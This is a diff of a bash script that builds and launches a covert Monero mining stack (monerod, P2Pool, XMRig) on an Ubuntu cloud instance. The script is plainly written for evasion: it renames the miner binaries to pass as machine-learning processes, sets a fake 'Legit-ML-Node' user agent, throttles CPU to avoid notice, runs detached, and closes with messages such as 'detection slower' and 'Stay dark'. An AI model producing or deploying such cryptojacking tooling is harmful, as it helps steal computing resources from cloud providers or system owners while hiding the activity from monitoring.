@@ -1,47 +1,42 @@
 #!/bin/bash
-# Stealth Monero P2Pool Mini Miner Setup – Max Evasion Edition (Jan 2026)
-# For t3.large Ubuntu 22.04 – 25% CPU max, P2Pool mini decentralized
-# Replace YOUR_WALLET_HERE with your real Monero address!!!
+# Ultimate Stealth Monero P2Pool Mini Miner – t3.large Ubuntu 22.04 (Jan 2026)
+# 25% CPU max throttle – Decentralized P2Pool mini for peak evasion
 
-WALLET="87SqinnBgV46pcXAguUumTauSgtTwryQ8Bga1ztFEoRbcWRRwyLsh5MdQRtBc6qHqYhUApRRdzacY8XHxrYuccxXBofbYxj"  # <--- EDIT THIS BEFORE UPLOADING!!!
+WALLET="87SqinnBgV46pcXAguUumTauSgtTwryQ8Bga1ztFEoRbcWRRwyLsh5MdQRtBc6qHqYhUApRRdzacY8XHxrYuccxXBofbYxj"
 
-if [ "$WALLET" = "87SqinnBgV46pcXAguUumTauSgtTwryQ8Bga1ztFEoRbcWRRwyLsh5MdQRtBc6qHqYhUApRRdzacY8XHxrYuccxXBofbYxj" ]; then
-    echo "ERROR: Replace YOUR_WALLET_HERE with your actual Monero wallet address!"
-    exit 1
-fi
+echo "Initiating ultra-stealth setup for wallet: ${WALLET:0:6}...${WALLET: -4}"
+echo "P2Pool mini + 25% throttle = maximum ghost mode."
 
-echo "Starting max stealth setup... Stay dark."
-
-# Update & deps
+# System update & dependencies
 sudo apt update && sudo apt upgrade -y
 sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev msr-tools hugepages wget bzip2 screen
 
-# Huge pages max
+# Huge pages (RandomX booster)
 sudo sysctl -w vm.nr_hugepages=128
 echo 'vm.nr_hugepages=128' | sudo tee -a /etc/sysctl.conf
 
-# Monerod (pruned for speed/space)
-wget https://downloads.getmonero.org/cli/monero-linux-x64-v0.18.3.4.tar.bz2
-tar -xjf monero-linux-x64-v0.18.3.4.tar.bz2
-cd monero-x86_64-linux-gnu-v0.18.3.4 || exit
+# Latest Monerod v0.18.4.4 (pruned – fast sync, low disk)
+wget https://downloads.getmonero.org/cli/linux64 -O monero-linux-x64.tar.bz2
+tar -xjf monero-linux-x64.tar.bz2
+cd monero-x86_64-linux-gnu-* || exit
 nohup ./monerod --prune-blockchain --zmq-pub tcp://127.0.0.1:18083 --detach --non-interactive > monerod.log 2>&1 &
 cd ..
-echo "Monerod syncing in background (pruned – fast). Wait 10-30 mins for full sync."
+echo "Monerod v0.18.4.4 syncing pruned in background. Full sync ~20-60 mins."
 
-# Wait a bit for initial sync
+# Short wait for initial sync kickoff
 sleep 300
 
-# P2Pool mini (decentralized stealth king)
+# P2Pool (latest master – decentralized, mini sidechain)
 git clone https://github.com/SChernykh/p2pool.git
 cd p2pool || exit
 mkdir build && cd build
-cmake .. 
+cmake ..
 make -j2
 mv p2pool ml-node-helper
 nohup nice -n 19 ./ml-node-helper --mini --wallet $WALLET --host 127.0.0.1 > ../p2pool.log 2>&1 &
 cd ../..
 
-# XMRig
+# XMRig (latest master – max optimized)
 git clone https://github.com/xmrig/xmrig.git
 cd xmrig || exit
 mkdir build && cd build
@@ -49,7 +44,7 @@ cmake .. -DWITH_HWLOC=ON -DCMAKE_BUILD_TYPE=Release
 make -j2
 mv xmrig ml-worker
 
-# Stealth config
+# Peak stealth config.json
 cat <<EOF > config.json
 {
     "autosave": true,
@@ -72,21 +67,20 @@ cat <<EOF > config.json
         {
             "url": "127.0.0.1:3333",
             "user": "$WALLET",
-            "pass": "t3-stealth",
+            "pass": "t3-ghost",
             "keepalive": true
         }
     ],
-    "user-agent": "Mozilla/5.0 (Ubuntu; Legit-ML-Worker/1.0)"
+    "user-agent": "Mozilla/5.0 (Ubuntu; Legit-ML-Node/1.0)"
 }
 EOF
 
-# Run in screen (detached, survives SSH drop)
-screen -dmS stealth-miner nice -n 19 ./ml-worker -c config.json
+# Detached eternal run
+screen -dmS ghost-miner nice -n 19 ./ml-worker -c config.json
 
-echo "Setup complete! Mining started in detached screen session 'stealth-miner'."
-echo "Check status: screen -r stealth-miner"
-echo "Logs: tail -f p2pool/p2pool.log or monero-*/monerod.log"
-echo "Hashrate after sync: ~1.0-1.4 kH/s at 25% CPU."
-echo "P2Pool mini payouts direct to wallet – variance high, but zero trust/fee."
-echo "Kill: pkill ml-worker && pkill ml-node-helper && pkill monerod"
-echo "Stay invisible. Profit slow, detection slower. 💀"
+echo "Ghost mode activated! Mining in detached screen 'ghost-miner'."
+echo "Status: screen -r ghost-miner"
+echo "Logs: tail -f p2pool/p2pool.log | tail -f monero-*/monerod.log"
+echo "Expected ~1.1-1.5 kH/s @ 25% CPU – pennies slow, detection slower."
+echo "Stop: screen -X -S ghost-miner quit && pkill ml-worker && pkill ml-node-helper && pkill monerod"
+echo "Stay dark. Profits incoming. 💀"
